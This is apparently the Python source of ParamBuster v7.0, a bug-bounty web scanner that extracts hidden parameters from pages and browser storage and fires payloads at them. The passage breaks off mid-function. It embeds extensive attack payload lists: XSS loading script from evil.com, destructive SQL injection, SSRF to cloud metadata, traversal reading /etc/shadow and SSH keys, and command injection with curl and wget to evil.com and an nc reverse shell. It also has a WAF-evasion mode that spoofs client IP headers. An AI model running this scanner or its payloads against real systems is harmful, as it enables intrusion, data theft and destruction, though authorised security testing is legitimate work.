#!/usr/bin/env python3

import argparse
import requests
import threading
import queue
import random
import time
import json
import logging
import urllib.parse
import re
import hashlib
import os
import csv
import sys
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from difflib import SequenceMatcher
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import ssl
import colorama
from colorama import Fore, Back, Style
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, WebDriverException



# Setup logging
def setup_logging(verbose=False, log_file=None):
    """Setup logging configuration."""
    log_format = '%(asctime)s - %(levelname)s - %(message)s'
    log_level = logging.DEBUG if verbose else logging.INFO

    # Configure root logger
    logging.basicConfig(level=log_level, format=log_format, handlers=[])

    # Console handler - only INFO and above for non-verbose
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_formatter = logging.Formatter('%(message)s')  # Simplified format for console
    console_handler.setFormatter(console_formatter)

    # File handler - all levels
    file_handler = None
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        file_formatter = logging.Formatter(log_format)
        file_handler.setFormatter(file_formatter)

    # Get logger
    logger = logging.getLogger(__name__)
    logger.handlers.clear()  # Clear existing handlers
    logger.addHandler(console_handler)
    if file_handler:
        logger.addHandler(file_handler)
    logger.setLevel(log_level)

    return logger

logger = setup_logging()

# Queue for threading
task_queue = queue.Queue()

# Banners (raw strings)
START_BANNER = r"""
  ____                         ____            _            
 |  _ \ __ _ _ __ ___   __ _  | __ ) _   _ ___| |_ ___ _ __ 
 | |_) / _` | '_ ` _ \ / _` | |  _ \| | | / __| __/ _ \ '__|
 |  __/ (_| | | | | | | (_| | | |_) | |_| \__ \ ||  __/ |   
 |_|   \__,_|_| |_| |_|__, | |____/ \__,_|___/\__\___|_|   
                                                
        ParamBuster v7.0 - Bug Bounty
                Version: 7.0
        Developed by: ArkhAngelLifeJiggy
        GitHub:https://github.com/LifeJiggy
"""

END_BANNER = r"""
   _____           _
  | ____|_ __   __| |
  |  _| | '_ \ / _` |
  | |___| | | | (_| |
  |_____|_| |_|__,_|
  Hunt Complete! Happy Bounties, Buddy!
"""

PARAMS_BANNER = """
 [+] Starting Parameter Extraction...
"""

VULN_BANNER = """
 [+] Scanning for Potential Vulnerabilities...
"""

# Built-in strong wordlist
strong_wordlist = [
    "id", "user", "username", "password", "email", "token", "key", "session", "auth", "api_key",
    "redirect", "url", "dest", "next", "goto", "path", "file", "include", "page", "action",
    "cmd", "command", "exec", "debug", "admin", "login", "logout", "q", "search", "query",
    "data", "input", "value", "type", "mode", "config", "settings", "profile", "account",
    "role", "access", "permission", "grant", "revoke", "state", "nonce", "callback", "return",
    "source", "target", "resource", "object", "item", "index", "offset", "limit", "sort",
    "filter", "category", "tag", "name", "title", "content", "body", "message", "text",
    "image", "upload", "dir", "directory", "folder", "root", "home", "site", "domain",
    "host", "port", "ip", "addr", "address", "version", "v", "ver", "build", "release",
    "test", "dev", "prod", "env", "stage", "secret", "hash", "sig", "signature", "time",
    "date", "timestamp", "lang", "locale", "region", "country", "city", "lat", "lon"
]

# Full vulnerability payloads (40 each, all intact)
vuln_payloads = {
    "xss": [
        "<script>alert(1)</script>", "javascript:alert(1)", "'\"><img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "'';!--\"<XSS>=&{()}", "<img src=javascript:alert(1)>",
        "<iframe src=javascript:alert(1)>", "onerror=alert(1)//", "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>", "<a href=javascript:alert(1)>click</a>",
        "<script src=//evil.com/x.js></script>", "'-alert(1)-'", "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>", "<video onerror=alert(1)>", "<audio onerror=alert(1)>",
        "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>", "xss\"-alert(1)-\"",
        "<script>eval('alert(1)')</script>", "<base href=javascript:alert(1)//>",
        "<link rel=stylesheet href=javascript:alert(1)>", "<style>@import 'javascript:alert(1)';</style>",
        "<meta content=\"1;javascript:alert(1)\">", "<form action=javascript:alert(1)>",
        "<button formaction=javascript:alert(1)>", "<input type=image src=javascript:alert(1)>",
        "<isindex action=javascript:alert(1)>", "<template onbeforetemplate=alert(1)>",
        "<script>window['al'+'ert'](1)</script>", "<img src=x onevent=alert(1)>",
        "<div onmouseover=alert(1)>", "<select onchange=alert(1)>", "<keygen onfocus=alert(1)>",
        "<textarea onfocus=alert(1) autofocus>", "<script>Function('alert(1)')()</script>",
        "<script>new Function('alert(1)')()</script>", "<math href=javascript:alert(1)>",
        "<frameset onload=alert(1)>", "</title><script>alert(1)</script>"
    ],
    "sqli": [
        "' OR 1=1 --", "1; DROP TABLE users --", "' UNION SELECT NULL --", "' OR '1'='1",
        "1' OR '1'='1' --", "admin' --", "' OR SLEEP(5) --", "1; WAITFOR DELAY '0:0:5' --",
        "' UNION SELECT user(),database(),version() --", "1' AND 1=CONVERT(int,'a') --",
        "' OR IF(1=1,SLEEP(5),0) --", "1' AND SUBSTRING((SELECT database()),1,1)='t' --",
        "' OR EXISTS(SELECT * FROM users) --", "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
        "' OR 1=CAST('1' AS INT) --", "1' AND BENCHMARK(1000000,MD5(1)) --", "' OR @@version LIKE '%'",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()))) --", "' OR UPDATEXML(1,CONCAT(0x7e,database()),1) --",
        "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(database(),0x7e) FROM information_schema.tables) --",
        "' OR 1=CAST((SELECT database()) AS INT) --", "1' OR 1=(SELECT 1 FROM dual) --",
        "' AND SUBSTRING(password,1,1)='a' --", "1' OR LENGTH(database())>5 --",
        "' OR ASCII(SUBSTRING((SELECT user()),1,1))>64 --", "1' AND 1=IF(1=1,1,0) --",
        "' OR 1 IN (SELECT 1) --", "1' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --",
        "' OR RANDOMBLOB(1000000) --", "1' AND SLEEP(CASE WHEN 1=1 THEN 5 ELSE 0 END) --",
        "' OR CONV(HEX(1),16,10)=1 --", "1' OR 1=(SELECT TOP 1 1 FROM users) --",
        "' AND SUBSTRING((SELECT @@version),1,1)='5' --", "1' OR BINARY 'a'='A' --",
        "' OR 1=TO_NUMBER('1') --", "1' AND 1=(SELECT COUNT(*) FROM sysobjects) --",
        "' OR MAKE_SET(1,'a','b')='a' --", "1' AND FIND_IN_SET(1,'1,2,3')>0 --",
        "' OR ELT(1,'a','b')='a' --", "1' AND REGEXP_SUBSTR('abc', 'a')='a'",
        "\" OR 1=1 --", "\\' OR 1=1 --", "` OR 1=1 --"
    ],
    "ssrf": [
        "http://localhost", "http://127.0.0.1", "http://burpcollaborator.net", "http://169.254.169.254",
        "http://0.0.0.0", "file:///etc/passwd", "http://internal.example.com", "http://metadata.google.internal",
        "http://169.254.169.254/latest/meta-data/", "http://[::1]", "ftp://localhost", "gopher://127.0.0.1:22",
        "http://127.0.0.1:8080", "http://127.0.0.1:22", "http://127.0.0.1/admin", "http://10.0.0.1",
        "http://192.168.0.1", "http://172.16.0.1", "dict://127.0.0.1:6379", "ldap://localhost",
        "http://127.0.0.1:3306", "http://127.0.0.1:5432", "http://127.0.0.1:9200", "http://127.0.0.1:11211",
        "http://127.0.0.1:6379/info", "http://localhost:80", "http://localhost:443", "http://127.1.1.1",
        "http://internal-service.local", "http://127.0.0.1:8081/health", "http://127.0.0.1:8000",
        "http://169.254.169.254/computeMetadata/v1/", "http://127.0.0.1:8080/api", "file:///proc/self/environ",
        "http://127.0.0.1:9000", "http://127.0.0.1:8080/status", "http://127.0.0.1:8080/debug",
        "http://127.0.0.1:8080/server-info", "http://127.0.0.1:8080/env", "http://127.0.0.1:8080/trace",
        "https://example.com", "https://google.com"
    ],
    "open_redirect": [
        "//google.com", "http://evil.com", "//attacker.com", "https://malicious.com", "/\\evil.com",
        "http://example.com@evil.com", "//evil.com/%2F..", "javascript:alert(1)", "//google.com%0d%0aevil.com",
        "http://127.0.0.1%09evil.com", "//evil.com#", "http://evil.com/#", "/../../evil.com",
        "http://evil.com/?q=", "//evil.com/path", "http://google.com%252Fevil.com", "//evil.com%2F%2F",
        "http://evil.com%0d%0a", "http://evil.com%23", "//evil.com%09", "http://evil.com%2523",
        "/redirect?url=evil.com", "/redir?url=evil.com", "/go?url=evil.com", "/out?url=evil.com",
        "/link?url=evil.com", "/next?url=evil.com", "/dest?url=evil.com", "/redirector?url=evil.com",
        "/r?url=evil.com", "/forward?url=evil.com", "/jump?url=evil.com", "/goto?url=evil.com",
        "/open?url=evil.com", "/nav?url=evil.com", "/redir_to?url=evil.com", "/redirect_uri=evil.com",
        "/callback?url=evil.com", "/return?url=evil.com", "/continue?url=evil.com", "/target?url=evil.com",
        "//www.google.com/url?sa=t&url=http://evil.com"
    ],
    "idor": [
        "1", "2", "0", "-1", "999999", "admin", "user1", "test", "12345", "1000",
        "1 OR 1=1", "1; DROP TABLE users", "1' OR '1'='1", "user/admin", "id=1",
        "id=2", "id=0", "id=-1", "id=999999", "uuid=123e4567-e89b-12d3-a456-426614174000",
        "user_id=1", "user_id=admin", "account_id=1", "session_id=1", "token=abc123",
        "profile_id=1", "order_id=1", "item_id=1", "product_id=1", "page_id=1",
        "doc_id=1", "file_id=1", "record_id=1", "entry_id=1", "group_id=1",
        "role_id=1", "permission_id=1", "key_id=1", "secret_id=1", "data_id=1",
        "null", "true", "false"
    ],
    "path_traversal": [
        "../", "../../", "../../../", "/etc/passwd", "../etc/passwd", "../../etc/passwd",
        "..\\", "..\\..\\", "..\\..\\..\\", "\\windows\\system32\\cmd.exe", "../windows/system32",
        "/../../../../etc/shadow", ".././../etc/passwd", "%2e%2e%2f", "%2e%2e%5c",
        "..%252f", "..%5c", "/..%2fetc/passwd", "/etc/passwd%00", "../etc/passwd%00",
        "/proc/self/environ", "../proc/self/environ", "/var/www/html", "../var/www/html",
        "/../../../../boot.ini", "../boot.ini", "/etc/hosts", "../etc/hosts", "../../etc/hosts",
        "/home/user/.ssh/id_rsa", "../home/user/.ssh/id_rsa", "/root/.bashrc", "../root/.bashrc",
        "/../../../../etc/passwd%00", "../etc/passwd%252f", "/etc/passwd%23", "../etc/passwd%0d",
        "/var/log/apache2/access.log", "../var/log/apache2/access.log", "/windows/win.ini",
         "....//....//etc/passwd",  "....\\\\....\\\\Windows\\System32\\cmd.exe"
    ],
    "lfi": [
        "/etc/passwd", "../etc/passwd", "../../etc/passwd", "/proc/self/environ", "../proc/self/environ",
        "/etc/hosts", "../etc/hosts", "/etc/shadow", "../etc/shadow", "/etc/issue",
        "/windows/win.ini", "../windows/win.ini", "/windows/system32/drivers/etc/hosts",
        "../windows/system32/drivers/etc/hosts", "/boot.ini", "../boot.ini", "/etc/apache2/apache2.conf",
        "../etc/apache2/apache2.conf", "/var/www/html/index.php", "../var/www/html/index.php",
        "/etc/nginx/nginx.conf", "../etc/nginx/nginx.conf", "/proc/version", "../proc/version",
        "/etc/profile", "../etc/profile", "/root/.bashrc", "../root/.bashrc", "/home/user/.ssh/id_rsa",
        "../home/user/.ssh/id_rsa", "/etc/passwd%00", "../etc/passwd%00", "/etc/passwd%252f",
        "../etc/passwd%252f", "/proc/self/cmdline", "../proc/self/cmdline", "/var/log/apache2/access.log",
        "../var/log/apache2/access.log", "/windows/system32/config/system", "../windows/system32/config/system",
        "/etc/group", "../etc/group", "php://filter/convert.base64-encode/resource=/etc/passwd"
    ],
    "command_injection": [
        ";whoami", "|whoami", "&whoami", "&&whoami", ";id", "|id", "&id", "&&id",
        ";ls", "|ls", "&ls", "&&ls", ";cat /etc/passwd", "|cat /etc/passwd", "&cat /etc/passwd",
        "&&cat /etc/passwd", ";dir", "|dir", "&dir", "&&dir", ";type nul", "|type nul",
        "&type nul", "&&type nul", ";ping 127.0.0.1", "|ping 127.0.0.1", "&ping 127.0.0.1",
        "&&ping 127.0.0.1", ";sleep 5", "|sleep 5", "&sleep 5", "&&sleep 5", ";curl evil.com",
        "|curl evil.com", "&curl evil.com", "&&curl evil.com", ";wget evil.com", "|wget evil.com",
        "&wget evil.com", "&&wget evil.com", "; nc -e /bin/sh 127.0.0.1 1337", "| nc -e /bin/sh 127.0.0.1 1337"
    ],
    "rce": [
        "<?php system('whoami'); ?>", "eval('system(\"whoami\")')", "exec('whoami')", "system('whoami')",
        "passthru('whoami')", "shell_exec('whoami')", "`whoami`", "$(whoami)", "os.system('whoami')",
        "import os; os.system('whoami')", "subprocess.call('whoami')", "Runtime.getRuntime().exec('whoami')",
        "<?php echo shell_exec('whoami'); ?>", "cmd.exe /c whoami", "powershell whoami", "IEX(whoami)",
        "perl -e 'print `whoami`'", "ruby -e 'puts `whoami`'", "python -c 'import os; os.system(\"whoami\")'",
        "node -e 'require(\"child_process\").exec(\"whoami\")'", ";whoami", "|whoami", "&whoami",
        "&&whoami", "system('id')", "exec('id')", "`id`", "$(id)", "os.system('id')",
        "cmd.exe /c dir", "powershell dir", "perl -e 'print `id`'", "ruby -e 'puts `id`'",
        "python -c 'import os; os.system(\"id\")'", "node -e 'require(\"child_process\").exec(\"id\")'",
        "bash -c 'whoami'", "sh -c 'whoami'", "zsh -c 'whoami'", "ksh -c 'whoami'", "tcsh -c 'whoami'",
        "<?php echo `id`; ?>", "<% request.getParameter(\"cmd\"); %>"
    ],
    "hpp": [
        "id=1&id=2", "user=admin&user=test", "page=1&page=2", "debug=true&debug=false"
    ]
}
    

# User-Agent for WAF bypass
ua = UserAgent()
colorama.init()



class ParamBuster:
    def __init__(self, url, method="GET", threads=50, delay=0, proxy=None, waf_bypass=False, max_requests=1000, payload_dir=None, wordlist_dir=None, browser_mode=False, performance="medium"):
        # Input validation
        if not url or not isinstance(url, str):
            raise ValueError("Valid URL must be provided.")
        if method.upper() not in ["GET", "POST", "JSON", "XML"]:
            raise ValueError("Method must be one of: GET, POST, JSON, XML")
        if threads < 1 or threads > 500:
            raise ValueError("Threads must be between 1 and 500")
        if delay < 0:
            raise ValueError("Delay cannot be negative")
        if max_requests < 1:
            raise ValueError("Max requests must be at least 1")

        self.url = self.validate_url(url.rstrip('/'))
        if not self.url:
            raise ValueError("Invalid URL provided.")

        self.response_hashes = {}
        self.response_hashes_lock = threading.Lock()
        self.method = method.upper()
        self.payload_dir = payload_dir or 'lists'
        self.wordlist_dir = wordlist_dir or 'strong_wordlist'
        self.vuln_payloads = self._load_payloads()
        
        # Performance tuning
        self.performance = performance.lower()
        if self.performance == "high":
            self.threads = max(threads, 100)
            self.timeout = 5
        elif self.performance == "low":
            self.threads = min(threads, 10)
            self.timeout = 15
        else: # medium
            self.threads = threads
            self.timeout = 10

        self.delay = max(delay, 0)
        self.strong_wordlist = self._load_wordlist()
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.waf_bypass = waf_bypass
        self.max_requests = max_requests
        self.browser_mode = browser_mode
        self.driver = None
        self.request_count = 0
        self.parameters = {}
        self.vulnerabilities = {}
        self.session = self._create_secure_session()
        self.rate_limiter = threading.Semaphore(self.threads)  
        self.colors = {
            "INFO": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "DEBUG": Fore.CYAN,
            "SUCCESS": Fore.MAGENTA,
            "RESET": Style.RESET_ALL
        }
        self.start_time = None
        self.progress_lock = threading.Lock()
        self.stability_threshold = 0.02 # Default
        self.wildcard_reflected = False

        logger.setLevel(logging.INFO)

        # Validate configuration
        self._validate_configuration()

    def _validate_configuration(self):
        """Validate tool configuration and dependencies."""
        try:
            # Check if required directories exist
            if not os.path.exists(self.payload_dir):
                self.log("INFO", f"Payload directory '{self.payload_dir}' not found, using built-in payloads")
            if not os.path.exists(self.wordlist_dir):
                self.log("INFO", f"Wordlist directory '{self.wordlist_dir}' not found, using built-in wordlist")

            # Check browser dependencies if browser mode enabled
            if self.browser_mode:
                try:
                    import selenium
                    from webdriver_manager.chrome import ChromeDriverManager
                except ImportError as e:
                    self.log("ERROR", f"Browser mode requires selenium: {e}")
                    self.browser_mode = False

            # Validate URL accessibility
            try:
                response = self.session.head(self.url, timeout=5)
                if response.status_code >= 400:
                    self.log("WARNING", f"URL returned status {response.status_code}")
            except Exception as e:
                self.log("WARNING", f"URL accessibility check failed: {e}")

        except Exception as e:
            self.log("ERROR", f"Configuration validation failed: {e}")
            
    
    def _load_payloads(self):
        """Loads vulnerability payloads from external files or uses built-ins."""
        if self.payload_dir and os.path.isdir(self.payload_dir):
            logger.info(f"Loading payloads from directory: {self.payload_dir}")
            loaded_payloads = {}
            for filename in os.listdir(self.payload_dir):
                if filename.endswith('.txt'):
                    vuln_type = filename.split('.')[0]
                    with open(os.path.join(self.payload_dir, filename), 'r', encoding='utf-8', errors='ignore') as f:
                        loaded_payloads[vuln_type] = [line.strip() for line in f if line.strip()]
            if loaded_payloads:
                return loaded_payloads
        logger.info("Using built-in payloads.")
        return vuln_payloads

    def _load_wordlist(self):
        """Loads wordlist from external files or uses built-ins."""
        wordlist = set(strong_wordlist)  # start with built-in
        if self.wordlist_dir and os.path.isdir(self.wordlist_dir):
            logger.info(f"Loading wordlist from directory: {self.wordlist_dir}")
            for filename in os.listdir(self.wordlist_dir):
                if filename.endswith('.txt'):
                    with open(os.path.join(self.wordlist_dir, filename), 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            param = line.strip()
                            if param and re.match(r'^[a-zA-Z_]\w*$', param):
                                wordlist.add(param)
        return list(wordlist)
               
            
    def log(self, level, message):
        """Logs messages with color."""
        color = self.colors.get(level, Fore.WHITE)
        print(f"{color}[{level}]{Style.RESET_ALL} - {message}")


    def validate_url(self, url):
        """Validate the URL."""
        try:
            result = urllib.parse.urlparse(url)
            if all([result.scheme in ['http', 'https'], result.netloc]):
                return url
            else:
                logger.error(f"Invalid URL: {url}")
                return None
        except Exception as e:
            logger.error(f"URL parsing error: {e}")
            return None
    
    def _create_secure_session(self):
        """Creates a secure session with retry and timeout settings."""
        session = requests.Session()

        # Retry strategy with exponential backoff
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            raise_on_status=False
        )

        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=self.threads,
            pool_maxsize=self.threads * 2
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # Security headers
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

        return session

    def _init_browser(self):
        """Initialize Selenium WebDriver for browser-based extraction."""
        if not self.browser_mode:
            return
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920,1080")
        if self.proxy:
            options.add_argument(f"--proxy-server={self.proxy}")
        try:
            self.driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
            self.driver.implicitly_wait(10)
            self.log("INFO", "Browser initialized for enhanced extraction")
        except WebDriverException as e:
            self.log("ERROR", f"Failed to initialize browser: {e}")
            self.browser_mode = False

    def _check_rate_limit(self):
        """Checks if the request count exceeds the maximum limit."""
        if self.request_count >= self.max_requests:
            self.log("ERROR", f" ({self.max_requests})")
            return False
        return True


    def get_headers(self):
        """Generates headers with WAF bypass techniques."""
        # Fallback user agents in case fake_useragent fails
        fallback_user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]

        try:
            user_agent = UserAgent().random
        except Exception as e:
            self.log("INFO", f"Using fallback User-Agent due to fake_useragent error: {e}")
            user_agent = random.choice(fallback_user_agents)

        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

        if self.waf_bypass:
            headers.update({
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                "X-Originating-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                "X-Remote-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                "X-Client-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            })

        return headers
    
    
    def safe_request(self, method, url, **kwargs):
        """Perform a safe HTTP request with rate limiting and security checks."""
        with self.rate_limiter:
            if not self._check_rate_limit():
                return None
            
            try:
                 # Security-focused request settings
                kwargs['timeout'] = kwargs.get('timeout', 10)
                kwargs['verify'] = True  # 
                kwargs['allow_redirects'] = False  #
                
                self.request_count += 1
                
                if method.upper() == 'GET':
                    response = self.session.get(url, **kwargs)
                elif method.upper() == 'POST':
                    response = self.session.post(url, **kwargs)
                else:
                    response = self.session.request(method, url, **kwargs)
                
                # Calculate hash of the response content
                response_hash = hashlib.md5(response.content).hexdigest()

                # Check for duplicates
                with self.response_hashes_lock:
                    if response_hash in self.response_hashes:
                        self.log("DEBUG", f"Duplicate response detected for {url}")
                        return None  # Skip processing

                    # Response Size limit
                    if len(response.content) > 1024 * 1024:  # 1MB
                        self.log("INFO", f"Response too large, potential DoS: {len(response.content)} bytes")
                        return None

                    self.response_hashes[response_hash] = url

                time.sleep(self.delay)  # Enforce delay after the request
                return response
                
            except requests.exceptions.SSLError as e:
                self.log("ERROR", f"SSL verification failed: {str(e)[:100]}")
                return None
            except requests.exceptions.Timeout:
                self.log("INFO", f"Request timed out")
                return None
            except requests.exceptions.RequestException as e:
                self.log("ERROR", f"Request failed: {str(e)[:100]}")
                return None
    

    def extract_hidden_parameters(self, response):
        """Extract hidden parameters with deeper scraping, including browser-based if enabled."""
        sources = {}

        # Parse HTML forms
        soup = BeautifulSoup(response.text, "html.parser")
        for input_tag in soup.find_all("input"):
            name = input_tag.get("name")
            if name and re.match(r'^[a-zA-Z_]\w*$', name):
                sources[name] = "form_fields"

        # Extract from URL parameters in JS and links
        js_params = re.findall(r'[?&](\w+)=[^&\s]+', response.text)
        for param in js_params:
            if re.match(r'^[a-zA-Z_]\w*$', param) and param not in sources:
                sources[param] = "url_params_js"

        # Extract JS variables (ParamSpider-like)
        js_vars = re.findall(r'var\s+(\w+)\s*=', response.text)
        for var in js_vars:
            if re.match(r'^[a-zA-Z_]\w*$', var) and var not in sources:
                sources[var] = "js_variables"

        # Extract from JSON
        try:
            json_data = json.loads(response.text)
            if isinstance(json_data, dict):
                for k in json_data.keys():
                    if re.match(r'^[a-zA-Z_]\w*$', k) and k not in sources:
                        sources[k] = "inline_json"
        except json.JSONDecodeError:
            pass

        # Look for parameters in script tags
        for script in soup.find_all('script'):
            script_content = script.string
            if script_content:
                js_params_in_script = re.findall(r'[?&](\w+)=[^&\s]+', script_content)
                for param in js_params_in_script:
                    if re.match(r'^[a-zA-Z_]\w*$', param) and param not in sources:
                        sources[param] = "script_tags"

        # AJAX request parameter extraction
        ajax_params = re.findall(r"data:\s*\{([^{]*?)\}", response.text)
        for match in ajax_params:
            params = re.findall(r"['\"]?(\w+)['\"]?\s*:", match)
            for param in params:
                if re.match(r'^[a-zA-Z_]\w*$', param) and param not in sources:
                    sources[param] = "ajax_requests"

        # Browser-based extraction if enabled
        if self.browser_mode and self.driver:
            browser_sources = self._extract_browser_params()
            for param, src in browser_sources.items():
                if param not in sources:
                    sources[param] = src

        return sources

    def _extract_browser_params(self):
        """Extract parameters using Selenium for DOM, cookies, storage, etc."""
        sources = {}
        dom_urls = set()
        cookies_set = set()
        local_storage_set = set()
        session_storage_set = set()
        try:
            self.driver.get(self.url)
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            # Extract from DOM elements
            elements = self.driver.find_elements(By.XPATH, "//*[@href or @src or @action or @formaction]")
            for elem in elements:
                href = elem.get_attribute("href") or elem.get_attribute("src") or elem.get_attribute("action") or elem.get_attribute("formaction")
                if href:
                    parsed = urllib.parse.urlparse(href)
                    if parsed.query:
                        query_params = urllib.parse.parse_qs(parsed.query)
                        for param in query_params.keys():
                            if param not in sources:
                                dom_urls.add(param)
                                sources[param] = "dom_urls"

            # Extract from forms (already in HTML, skip)

            # Extract from JavaScript variables (already in HTML, skip)

            # Extract from cookies
            cookies = self.driver.get_cookies()
            for cookie in cookies:
                if cookie['name'] and re.match(r'^[a-zA-Z_]\w*$', cookie['name']) and cookie['name'] not in sources:
                    cookies_set.add(cookie['name'])
                    sources[cookie['name']] = "cookies"

            # Extract from localStorage and sessionStorage
            local_storage = self.driver.execute_script("return Object.keys(localStorage);")
            for k in local_storage:
                if re.match(r'^[a-zA-Z_]\w*$', k) and k not in sources:
                    local_storage_set.add(k)
                    sources[k] = "localStorage"
            session_storage = self.driver.execute_script("return Object.keys(sessionStorage);")
            for k in session_storage:
                if re.match(r'^[a-zA-Z_]\w*$', k) and k not in sources:
                    session_storage_set.add(k)
                    sources[k] = "sessionStorage"

            # Log the extractions
            if dom_urls:
                self.log("INFO", f"extractDOMURLParams(): {sorted(dom_urls)}")
            if cookies_set:
                self.log("INFO", f"extractCookies(): {sorted(cookies_set)}")
            if local_storage_set:
                self.log("INFO", f"extractLocalStorage(): {sorted(local_storage_set)}")
            if session_storage_set:
                self.log("INFO", f"extractSessionStorage(): {sorted(session_storage_set)}")

        except Exception as e:
            self.log("ERROR", f"Browser extraction failed: {e}")

        return sources

    def calibrate_stability(self):
        """Calibrates the threshold by making multiple requests to see dynamic changes."""
        self.log("INFO", "Phase 0: Calibrating response stability...")
        diffs = []
        lengths = []
        try:
            base_r = self.session.get(self.url, headers=self.get_headers(), proxies=self.proxy, timeout=self.timeout)
            base_text = base_r.text
            for _ in range(3):
                r = self.session.get(self.url, headers=self.get_headers(), proxies=self.proxy, timeout=self.timeout)
                similarity = SequenceMatcher(None, base_text, r.text).ratio()
                diffs.append(1 - similarity)
                lengths.append(abs(len(r.text) - len(base_text)))
            
            avg_diff = sum(diffs) / len(diffs)
            avg_len = sum(lengths) / len(lengths)
            self.stability_threshold = max(0.02, avg_diff * 1.5)
            self.stability_len_threshold = max(15, avg_len * 1.5)
            self.log("INFO", f"Stability Thresholds: {self.stability_threshold:.4f} (diff), {self.stability_len_threshold:.0f} (length)")
        except Exception as e:
            self.log("DEBUG", f"Calibration failed: {e}")

    def check_wildcard_reflection(self):
        """Checks if the site reflects any random value (wildcard reflection)."""
        self.log("INFO", "Phase 0: Checking for wildcard reflection...")
        random_val = f"wildcard{random.randint(1000, 9999)}detect"
        try:
            test_url = f"{self.url}?non_existent_param_check={random_val}"
            r = self.session.get(test_url, headers=self.get_headers(), proxies=self.proxy, timeout=self.timeout)
            if random_val in r.text or random_val in str(r.headers):
                self.log("WARNING", "Wildcard reflection detected! The site reflects any value passed. Adjusting strategy.")
                self.wildcard_reflected = True
        except Exception as e:
            self.log("DEBUG", f"Wildcard check failed: {e}")

    def detect_parameters(self):
        """Detect parameters with powerful reflection and diff analysis (Optimized for speed)."""
        print(PARAMS_BANNER)
        self.log("INFO", f"Starting parameter detection on {self.url} (Mode: {self.performance})")

        if not self.url:
            self.log("ERROR", f"Invalid URL provided. Exiting parameter detection.")
            return

        # Get base response
        try:
            base_response = self.session.get(self.url, headers=self.get_headers(), proxies=self.proxy, timeout=self.timeout)
            base_response.raise_for_status()
            base_text = base_response.text
            base_length = len(base_text)
        except requests.RequestException as e:
            self.log("ERROR", f"Failed to fetch base response: {e}")
            return

        # Stability & Wildcard Checks
        self.calibrate_stability()
        self.check_wildcard_reflection()

        # Extract hidden parameters
        hidden_params = self.extract_hidden_parameters(base_response)
        
        # Combine wordlist and hidden params
        all_params_to_test = set(hidden_params.keys())
        if self.performance == "high":
            all_params_to_test.update(self.strong_wordlist)
        elif self.performance == "medium":
            all_params_to_test.update(self.strong_wordlist[:100])
        else:
            all_params_to_test.update(self.strong_wordlist[:20])

        total_params = len(all_params_to_test)
        self.log("INFO", f"Testing {total_params} parameters concurrently")
        
        self.processed_count = 0
        cached_headers = self.get_headers()

        def test_single_param(param):
            unique_val = f"pb{random.randint(1000, 9999)}ext"
            test_url = f"{self.url}?{param}={unique_val}" if self.method == "GET" else self.url
            data = {param: unique_val} if self.method in ["POST", "JSON"] else None
            
            try:
                if self.method == "JSON":
                    headers = cached_headers.copy()
